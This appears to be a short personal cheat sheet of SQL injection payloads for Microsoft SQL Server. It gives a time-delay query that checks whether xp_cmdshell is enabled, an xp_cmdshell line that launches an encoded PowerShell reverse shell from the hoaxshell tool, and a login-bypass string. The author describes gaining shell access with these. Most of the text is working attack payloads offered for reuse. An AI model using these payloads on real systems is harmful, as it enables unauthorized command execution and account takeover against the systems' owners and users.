# SQL Payloads

## Payload to Check for xp_cmdshell:
```sql
'; IF EXISTS (SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell' AND value_in_use = 1) WAITFOR DELAY '00:00:05' -- //
```

A five-second delay in the response confirmed its activation. Next, I created a PowerShell payload using hoaxshell:

Hoax Reverse Shell Payload:
```sh
'; EXEC xp_cmdshell 'powershell -e eQBvAHUAcgAtAHAAYQB5AGwAbwBhAGQA...'; -- //
```

Execute it and successfully gain shell access, as you can see in the screenshot.

![img](https://media.licdn.com/dms/image/D4E22AQEMx7xvCP8YLA/feedshare-shrink_1280/0/1714023914371?e=1726099200&v=beta&t=j-GJQ0LxllbbHyNGD2dQGqsx_NFpRnCP_mQxo5z5GCw)

## Auth Bypass
```sql
admin')&password=')+or+30>10/
```
![img](/SQL-Payloads/assets/sqli_auth_bypass.jpg)
